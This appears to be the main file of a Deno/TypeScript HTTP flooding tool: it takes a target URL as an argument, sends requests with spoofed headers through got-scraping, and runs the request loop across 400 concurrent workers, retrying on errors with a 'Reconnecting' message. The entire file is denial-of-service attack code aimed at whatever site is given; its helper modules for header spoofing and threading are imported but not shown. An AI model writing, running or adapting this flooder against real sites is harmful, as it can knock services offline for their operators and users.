import { gotScraping } from 'npm:got-scraping';
import { createSpoof } from './createSpoof/index.ts';
import { createThread } from "./createThread/index.ts";

const url = Deno.args[0];

if (!url) {
    console.error('required: <url>');
    Deno.exit(1);
}

console.log("\x1b[32m[!]\x1b[0m Target: " + url);

const oneResult = async () => {
    const headers = createSpoof();
    try {
        await gotScraping(url, {
            url,
            headers
        })
    }catch (_) {
        console.error("\x1b[31m[X]\x1b[0m Reconnecting....");
    }
}

createThread(oneResult, 400);